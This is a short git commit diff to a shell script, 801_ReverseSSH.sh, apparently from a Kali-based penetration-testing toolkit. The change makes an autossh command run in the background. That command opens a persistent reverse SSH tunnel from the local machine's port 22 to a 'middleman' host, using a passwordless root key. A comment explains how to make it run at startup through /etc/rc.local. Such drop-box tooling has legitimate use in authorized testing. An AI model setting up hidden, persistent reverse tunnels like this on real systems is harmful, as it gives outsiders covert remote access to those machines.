f5b40c6f4e2566b3f8286d8d4347a0ee1b6fd54c
root <root@localhost.localdomain>
2016-03-09 15:08:33 -0500

    synching

--- 801_ReverseSSH.sh
+++ 801_ReverseSSH.sh
@@ -4,7 +4,7 @@ if test "$#" -ne 1; then
     echo "Must supply 1 argument - Middleman IP address"
 fi
 
-autossh -M 10984 -o "PubkeyAuthentication=yes" -o "PasswordAuthentication=no" -i /root/.ssh/nopwd -R 6666:localhost:22 kali_rvs@$1 
+autossh -M 10984 -N -f -o "PubkeyAuthentication=yes" -o "PasswordAuthentication=no" -i /root/.ssh/nopwd -R 6666:localhost:22 kali_rvs@$1 
 
 #to make this run on startup, add the following to /etc/rc.local and make sure Certificates are in configured
 /opt/kali_plus/801_ReverseSSH.sh [Remote Listener IP]
